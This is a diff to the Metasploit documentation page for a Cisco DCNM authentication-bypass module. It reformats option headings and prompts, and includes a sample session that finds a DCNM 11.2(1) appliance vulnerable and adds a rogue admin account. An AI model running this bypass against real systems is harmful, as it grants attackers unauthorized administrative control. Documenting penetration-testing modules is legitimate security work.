@@ -25,19 +25,19 @@ List the steps needed to make sure this thing works
 
 ## Options
 
-**RHOSTS**
+### RHOSTS
 
 Set the target host.
 
-**USERNAME**
+### USERNAME
 
 Set the USERNAME of the admin account you want to add.
 
-**PASSWORD**
+### PASSWORD
 
 Set the PASSWORD of the admin account you want to add.
 
-**RETRIES**
+### RETRIES
 
 You can change the maximum number of attempts to add an admin account by using `set RETRIES <max_retries>`.
 
@@ -46,15 +46,15 @@ You can change the maximum number of attempts to add an admin account by using `
 ### DCNM 11.2(1) - Linux OVA Appliance
 
 ```
-msf6 > use auxiliary/admin/networking/cisco_dcnm_auth_bypass
-msf6 auxiliary(admin/networking/cisco_dcnm_auth_bypass) > set RHOST 192.168.159.33
+msf > use auxiliary/admin/networking/cisco_dcnm_auth_bypass
+msf auxiliary(admin/networking/cisco_dcnm_auth_bypass) > set RHOST 192.168.159.33
 RHOST => 192.168.159.33
-msf6 auxiliary(admin/networking/cisco_dcnm_auth_bypass) > check
+msf auxiliary(admin/networking/cisco_dcnm_auth_bypass) > check
 [+] 192.168.159.33:443 - The target is vulnerable.
-msf6 auxiliary(admin/networking/cisco_dcnm_auth_bypass) > run
+msf auxiliary(admin/networking/cisco_dcnm_auth_bypass) > run
 [*] Running module against 192.168.159.33
 
 [+] Admin account with username: 'frederick' and password: '1OwNqJnO' added!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/networking/cisco_dcnm_auth_bypass) >
+msf auxiliary(admin/networking/cisco_dcnm_auth_bypass) >
 ```
